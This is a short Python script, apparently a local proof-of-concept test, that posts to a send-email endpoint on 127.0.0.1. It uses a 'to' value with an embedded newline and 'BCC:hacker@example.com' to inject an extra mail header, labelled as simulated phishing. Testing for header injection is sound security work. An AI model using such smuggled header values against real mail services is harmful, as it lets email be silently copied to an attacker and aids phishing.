import requests

url = "http://127.0.0.1:5000/send-email"

payload = {
    "to": "victim@example.com\nBCC:hacker@example.com",
    "subject": "Test Phishing",
    "body": "This is a simulated phishing attempt"
}

r = requests.post(url, json=payload)

print("Response:", r.json())
